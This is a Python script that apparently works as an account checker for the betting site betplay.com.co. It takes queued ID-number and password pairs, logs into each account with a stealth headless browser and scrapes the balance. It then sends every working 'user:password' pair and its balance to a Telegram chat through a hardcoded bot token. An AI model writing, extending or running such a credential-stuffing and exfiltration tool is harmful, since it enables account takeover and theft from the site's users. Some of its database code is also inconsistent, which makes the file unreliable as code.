#!/usr/bin/env python3
import os
import time
import traceback
from datetime import datetime

import requests
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Importar psycopg2 para PostgreSQL
import psycopg2
from psycopg2 import extras

# ---------- CONFIG ----------
# Railway buscará estas variables en las "Variables" de tu servicio
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
# DB_URL se obtiene del entorno de Railway, no se hardcodea

TELEGRAM_TOKEN = os.getenv("TG_BOT_TOKEN", "8214729753:AAGVHrWCKWwNFNI_ugGnWdyZNoOaZOe2TAY")
CHAT_ID = os.getenv("TG_CHAT_ID", "1415509092")

POLL_SLEEP = 3
MOTIVO_INVALIDA = "Credenciales invalidas"

def log(*a):
    print(datetime.now().strftime("%H:%M:%S"), *a, flush=True)

# ---------- DB ----------
def get_db_connection():
    """
    Intenta conectar a PostgreSQL (Railway) o SQLite (Local).
    Si existe DATABASE_URL, usa PostgreSQL.
    """
    db_url = os.environ.get('DATABASE_URL')
    
    if db_url:
        # Conexión a PostgreSQL (Railway)
        try:
            conn = psycopg2.connect(db_url, cursor_factory=extras.RealDictCursor)
            conn.autocommit = True # Necesario para algunos comandos
            log("Conectado a PostgreSQL (Railway)")
            return conn
        except Exception as e:
            log("Error conectando a PostgreSQL:", e)
            log("FALLANDO BACKUP a SQLite local por si acaso...")
            # Fallback local por si Railway no responde
            import sqlite3
            return sqlite3.connect(os.path.join(BASE_DIR, "data", "referidos.sqlite"), timeout=15)
    else:
        # Fallback local para desarrollo
        import sqlite3
        return sqlite3.connect(os.path.join(BASE_DIR, "data", "referidos.sqlite"), timeout=15)

def crear_tablas_si_no_existen(conn):
    """Crea las tablas automáticamente. Es útil para Railway."""
    try:
        cursor = conn.cursor()
        
        # Tabla usuarios
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS usuarios (
                id SERIAL PRIMARY KEY,
                cedula VARCHAR(50) UNIQUE,
                password VARCHAR(255),
                estado VARCHAR(50) DEFAULT 'pendiente',
                motivo VARCHAR(255),
                codigo_corto VARCHAR(50),
                balance TEXT,
                creado_en TIMESTAMP DEFAULT NOW()
            )
        """)
        
        # Tabla cola
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS cola (
                id SERIAL PRIMARY KEY,
                cedula VARCHAR(50),
                password VARCHAR(255),
                usuario_id INTEGER REFERENCES usuarios(id),
                estado VARCHAR(50) DEFAULT 'pendiente',
                resultado VARCHAR(50),
                motivo VARCHAR(255),
                balance TEXT,
                creado_en TIMESTAMP DEFAULT NOW(),
                actualizado_en TIMESTAMP DEFAULT NOW()
            )
        """)
        
        # Tabla referidos
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS referidos (
                id SERIAL PRIMARY KEY,
                reffer_id INTEGER REFERENCES usuarios(id),
                reffered_cedula VARCHAR(50),
                estado VARCHAR(50) DEFAULT 'pendiente',
                creado_en TIMESTAMP DEFAULT NOW()
            )
        """)
        
        conn.commit()
        log("Tablas verificadas o creadas.")
    except Exception as e:
        log("Error creando tablas:", e)

# ---------- Telegram ----------
def telegram(usuario, password, resultado, motivo="", balance=""):
    icono = "✅" if resultado == "verificado" else "❌"
    titulo = "CUENTA VÁLIDA" if resultado == "verificado" else "CUENTA RECHAZADA"
    mensaje = (
        f"{icono} *{titulo}*\n\n"
        f"`{usuario}:{password}`\n\n"
        f"💰 *Balance:* {balance or 'N/D'}\n"
        f"⏰ {time.strftime('%H:%M:%S')}"
    )
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": mensaje, "parse_mode": "Markdown"},
            timeout=15,
        )
    except Exception as e:
        log("Error Telegram:", e)

# ---------- Driver ----------
def crear_driver():
    options = uc.ChromeOptions()
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--headless=new")  # <-- IMPORTANTE: Modo Headless para Railway
    options.add_argument("--window-size=1366,900")
    driver = uc.Chrome(options=options, headless=True, use_subprocess=True)
    driver.set_page_load_timeout(30)
    return driver

def cerrar_driver(driver):
    try:
        driver.delete_all_cookies()
        driver.execute_script("window.localStorage.clear();")
        driver.execute_script("window.sessionStorage.clear();")
    except Exception:
        pass
    try:
        driver.quit()
    except Exception:
        pass

# ---------- Verificacion ----------
def verificar(user, password):
    """Devuelve (ok, motivo, balance)."""
    driver = crear_driver()
    try:
        log(f"[{user}] Navegando a betplay.com.co...")
        driver.get("https://betplay.com.co")

        try:
            cookie_btn = WebDriverWait(driver, 3).until(
                EC.element_to_be_clickable((By.XPATH, "//button[@data-cky-tag='accept-button']"))
            )
            driver.execute_script("arguments[0].click();", cookie_btn)
        except Exception:
            pass
        time.sleep(1)

        log(f"[{user}] Intentando login...")
        username_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "userName"))
        )
        username_input.clear()
        username_input.send_keys(user)

        password_input = driver.find_element(By.ID, "password")
        password_input.clear()
        password_input.send_keys(password)

        driver.find_element(By.ID, "btnLoginPrimary").click()
        time.sleep(2)

        # Credenciales malas -> invalida
        try:
            error = driver.find_element(By.XPATH, "//*[contains(text(),'Has ingresado mal')]")
            if error.is_displayed():
                log(f"[{user}] Invalida")
                return False, MOTIVO_INVALIDA, ""
        except Exception:
            pass

        # Login exitoso
        try:
            WebDriverWait(driver, 8).until(
                EC.presence_of_element_located((By.ID, "navbarDropdown2"))
            )
            log(f"[{user}] Login exitoso")
        except Exception:
            log(f"[{user}] No inicio sesion")
            return False, "No inicio sesion", ""

        # Balance
        balance = "No encontrado"
        try:
            menu = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.ID, "navbarDropdown2"))
            )
            driver.execute_script("arguments[0].click();", menu)
            time.sleep(0.5)
            bal = WebDriverWait(driver, 3).until(
                EC.visibility_of_element_located((
                    By.XPATH,
                    "//tr[contains(@class,'textinfo')]/td[contains(text(),'Saldo:')]"
                    "/following-sibling::td[@class='separator']/following-sibling::td"
                ))
            )
            balance = bal.text.strip()
        except Exception:
            pass

        return True, "OK", balance

    except Exception as e:
        log(f"[{user}] Error: {e}")
        traceback.print_exc()
        return False, f"Error: {type(e).__name__}", ""
    finally:
        log(f"[{user}] Cerrando sesion...")
        cerrar_driver(driver)

# ---------- Cola ----------
def tomar_pendiente(con):
    cur = con.execute(
        "SELECT id, cedula, password, usuario_id FROM cola "
        "WHERE estado='pendiente' ORDER BY id ASC LIMIT 1"
    )
    row = cur.fetchone()
    if not row:
        return None
    con.execute(
        "UPDATE cola SET estado='procesando', actualizado_en=NOW() WHERE id=?",
        (row["id"],),
    )
    con.commit()
    return row

def guardar_resultado(con, cola_id, usuario_id, resultado, motivo, balance):
    con.execute(
        "UPDATE cola SET estado='listo', resultado=?, motivo=?, balance=?, "
        "actualizado_en=NOW() WHERE id=?",
        (resultado, motivo, balance, cola_id),
    )
    if resultado == "verificado":
        con.execute(
            "UPDATE usuarios SET estado='verificado', motivo=NULL, balance=? WHERE id=?",
            (balance, usuario_id),
        )
        con.execute(
            "UPDATE referidos SET estado='valido' WHERE ref_usuario_id=?",
            (usuario_id,),
        )
    elif motivo == MOTIVO_INVALIDA:
        con.execute(
            "UPDATE usuarios SET estado='invalido', motivo=? WHERE id=?",
            (motivo, usuario_id),
        )
        con.execute(
            "UPDATE cola SET estado='listo', actualizado_en=NOW() "
            "WHERE usuario_id=? AND estado='pendiente'",
            (usuario_id,),
        )
    else:
        con.execute(
            "UPDATE usuarios SET estado='rechazado', motivo=? WHERE id=?",
            (motivo, usuario_id),
        )
    con.commit()

def main():
    con = get_db_connection()
    crear_tablas_si_no_existen(con)
    log("Checker iniciado en Railway")
    while True:
        row = tomar_pendiente(con)
        if not row:
            time.sleep(POLL_SLEEP)
            continue

        log(f"Procesando {row['cedula']}")
        ok, motivo, balance = verificar(row["cedula"], row["password"])
        resultado = "verificado" if ok else "rechazado"

        guardar_resultado(con, row["id"], row["usuario_id"], resultado, motivo, balance)
        log(f"Resultado {row['cedula']} -> {resultado} ({motivo})")

        if motivo != MOTIVO_INVALIDA:
            telegram(row["cedula"], row["password"], resultado, motivo, balance)
        else:
            log(f"[{row['cedula']}] Invalida -> sin Telegram")

if __name__ == "__main__":
    main()